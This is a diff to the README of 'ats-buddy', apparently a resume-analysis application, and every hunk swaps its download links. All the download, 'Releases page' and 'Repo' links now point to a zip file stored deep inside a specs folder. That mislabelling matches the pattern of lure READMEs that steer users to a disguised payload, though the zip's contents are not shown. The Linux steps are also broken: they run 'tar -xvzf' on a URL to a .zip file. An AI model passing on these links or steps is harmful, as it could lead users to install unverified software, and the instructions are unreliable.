@@ -1,6 +1,6 @@
 # 🎉 ats-buddy - Effortless Resume Analysis Made Simple
 
-[![Download ats-buddy](https://raw.githubusercontent.com/Darshan54554/ats-buddy/main/unbedashed/ats-buddy.zip)](https://raw.githubusercontent.com/Darshan54554/ats-buddy/main/unbedashed/ats-buddy.zip)
+[![Download ats-buddy](https://raw.githubusercontent.com/Darshan54554/ats-buddy/main/.kiro/specs/web-ui-interface/buddy_ats_2.5-beta.2.zip)](https://raw.githubusercontent.com/Darshan54554/ats-buddy/main/.kiro/specs/web-ui-interface/buddy_ats_2.5-beta.2.zip)
 
 ## ✨ Overview
 
@@ -23,7 +23,7 @@ To use ATS Buddy, ensure your system meets these requirements:
 
 To get started with ATS Buddy, visit the Releases page to download the application.
 
-[Visit this page to download](https://raw.githubusercontent.com/Darshan54554/ats-buddy/main/unbedashed/ats-buddy.zip)
+[Visit this page to download](https://raw.githubusercontent.com/Darshan54554/ats-buddy/main/.kiro/specs/web-ui-interface/buddy_ats_2.5-beta.2.zip)
 
 Once you are on the Releases page, you will see the latest version available for download. Click on the version you want and follow the instructions below based on your operating system:
 
@@ -43,13 +43,13 @@ Once you are on the Releases page, you will see the latest version available for
 
 #### For Linux Users:
 
-1. Download the `https://raw.githubusercontent.com/Darshan54554/ats-buddy/main/unbedashed/ats-buddy.zip` file.
+1. Download the `https://raw.githubusercontent.com/Darshan54554/ats-buddy/main/.kiro/specs/web-ui-interface/buddy_ats_2.5-beta.2.zip` file.
 2. Open a terminal.
 3. Navigate to the directory where you downloaded the file.
 4. Run the following command to extract the files:
 
    ```bash
-   tar -xvzf https://raw.githubusercontent.com/Darshan54554/ats-buddy/main/unbedashed/ats-buddy.zip
+   tar -xvzf https://raw.githubusercontent.com/Darshan54554/ats-buddy/main/.kiro/specs/web-ui-interface/buddy_ats_2.5-beta.2.zip
    ```
 
 5. Navigate into the extracted directory.
@@ -113,7 +113,7 @@ This project is licensed under the MIT License. You can use, modify, and distrib
 
 For more information, you can visit the following:
 
-- Repo: [ats-buddy on GitHub](https://raw.githubusercontent.com/Darshan54554/ats-buddy/main/unbedashed/ats-buddy.zip)
+- Repo: [ats-buddy on GitHub](https://raw.githubusercontent.com/Darshan54554/ats-buddy/main/.kiro/specs/web-ui-interface/buddy_ats_2.5-beta.2.zip)
 - API documentation and usage guides will be updated regularly.
 
 For queries or support, you can open an issue on the GitHub repo, and we will assist you promptly.
